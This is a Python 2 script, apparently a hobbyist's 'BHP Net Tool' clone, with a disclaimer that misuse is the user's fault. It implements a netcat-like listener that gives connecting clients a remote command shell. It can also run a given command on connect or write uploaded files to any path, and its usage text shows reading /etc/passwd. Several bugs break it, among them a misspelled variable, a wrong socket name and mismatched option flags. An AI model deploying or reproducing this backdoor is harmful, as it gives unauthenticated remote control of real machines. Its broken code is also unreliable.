#  ___  ___   ___    __    _____   ___   __        __   __   __
# / _/ | _ \ | __|  /  \  |_   _| | __| | _\      |  \  \ `v' / ()
#| \__ | v / | _|  | /\ |   | |   | _|  | v |     | -<   `. .' 
# \__/ |_|_\ |___| |_||_|   |_|   |___| |__/      |__/    !_!   ()  
# ___   __    _____   ___    __           _  _   _  _     ___  _  __ 
#| _ \ |__`. |_   _| | _ \  /  \         | || | | || |   / _/ | |/ / 
#| v /  |_ |   | |   | v / | // |  ____  | >< | `._  _| | \__ |   <  
#|_|_\ |__.'   |_|   |_|_\  \__/  |____| |_||_|    |_|   \__/ |_|\_\
#
#project destiny: kinnda sniffer 
#
#
#if you will use this tool for bad things its your falt , I have no responibilty 
#about your shit so...("i gave you a hammer, you can break the window with him
#but you can fix almost everything with it, the choise is yours")
import socket
import threading
import sys
import getopt
import subprocess

#Define global variables:

listen             = False
Command            = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0




#all of the functions: 

def usage():
	print "BHP Net Tool"
	print "CREATED BY R3TR0_H4CK"
	print "Usage: netcat.py -t targer_host -p port"
	print "-l --listen               -listen om [host]:[port] for incoming connections"
	print "-e --execute=file_to_run  - execute the given file upon receving a connections"
	print "-c --command              - initialize a command shell"
	print "-u --upload=destinition -uopn reciving connection to upload a file and write to [destinition]"
	print
	print
	print "Examples:"
	print "netcat.py -t 192.168.0.1 -p 5555 -l -c"
	print "netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
	print 'netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"'
	sys.exit(0)
	
def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target
	if not len(sys.argv[1:]):
		usage()
	try:
		opts , args = getopt.getopt(sys.argv[1:], "hel:t:p:cu" , ["help" , "listen" , "execute" , "target" , "port" , "command" , "upload"])
	except getopt.GetoptError as err:
		print str(err)
		usage()
	for o,a in opts:
		if o in ("-h" , "--help"):
			usage()
		elif o in ("-l" , "--listen"):
			listen = True
		elif o in ("-e" , "--execute"):
			execute = a
		elif o in ("-u" , "--upload"):
			upload_destination = a
		elif o in ("-t" , "--target"):
			target = a
		elif o in ("-p" , "--port"):
			port = int(a)
		else:
			assert False, "Unhandled Option"
	if not listen and len(target) and port >0:
		#read in the buffer from the commandline
		#to stdin
		buffer = sys.stdin.read()
		
		#send data off
		client_sender(buffer)
	#all options commands:
	if listen:
		server_loop()

def client_sender(buffer):
	#setting up the socket:
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		#connecting to the target:
		client.connect((target , port))
		if len(buffer):
			client.send(buffer)
		while True:
			
			#wait for data:
			recv_len = 1
			response = ""
			while recv_len:
				data      = client.recv(4096)
				recv_len  = len(data)
				response += data
				if rev_len<4096:
					break
			print response
			
			#wait for more
			
			buffer  = raw_input("")
			buffer += "\n"
			
			#send it off
			client.send(buffer)
	except:
		print "[*] Exception! Exiting."
		
		#disconnect
		
		client.close()
def server_loop():
	global target
	#if target is not define:
	if not len(target):
		target = "0.0.0.0"
	
	server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	server.bind((target , port))
	server.listen(5)
	while True:
		client_socket, addr = server.accept()
		
		#spin off a thread to handle our new client:
		client_thread = threading.Thread(target=client_handler , args=(client_socket,))
		client_thread.start()
def run_command(command):
	#train the newline:
	
	command = command.rstrip()
	
	#run the command and get output:
	try:
		output = subprocess.check_output(command , stderr=subprocess.STDOUT , shell = True)
	except:
		output = "Command Cant Be Executed..."
	return output
def client_handler(client_socket):
	global upload
	global execute
	global command
	#check if need to upload:
	if len(upload_destination):
		
		#read all the byte and write them to the destination:
		file_buffer = ""
		
		#will keep read while there is data:
		
		while True:
			data = client_socket.recv(1024)
			if not data:
				break
			else:
				file_buffer += data
		#write the data to file
		try:
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()
			#write thats everything went right:
			client_socket.send("Successfully Saved file to %s\r\n" %upload_destination)
		except:
			client_socket.send("Failed to save file to %s\r\n" %upload_destination)
	if len(execute):
		
		#run the command:
		output = run_command(execute)
		
		client_socket.send(output)
	if command:
		
		while True:
			#show a simple prompt:
			client.send("<BHP:#> ")
			
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)
			#send back the command output:
			response = run_command(cmd_buffer)
			#Send to client:
			client_socket.send(response)
#calls the main function:
main()






		
		
